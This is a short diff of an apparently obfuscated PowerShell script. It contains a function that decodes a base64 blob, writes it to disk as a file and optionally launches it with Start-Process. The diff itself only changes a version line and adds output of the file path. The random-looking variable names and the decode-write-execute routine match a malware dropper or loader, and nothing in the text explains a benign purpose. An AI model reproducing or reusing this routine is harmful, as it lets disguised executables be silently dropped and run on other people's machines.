@@ -1,11 +1,11 @@
-# V1.0.1
+Write-Output 'V1.1'
 Set-StrictMode -Off
 
 function z($5VAUPX0,$8UNyT,$C1A = $false){
     $CwgmejzO9vBEoiVkc3WIdxT7S = [System.Convert]::FromBase64String($5VAUPX0)
 
     [System.IO.File]::WriteAllBytes($8UNyT, $CwgmejzO9vBEoiVkc3WIdxT7S)
-
+    Write-Output $8UNyT
     if($C1A){
         Start-Process $8UNyT
     }
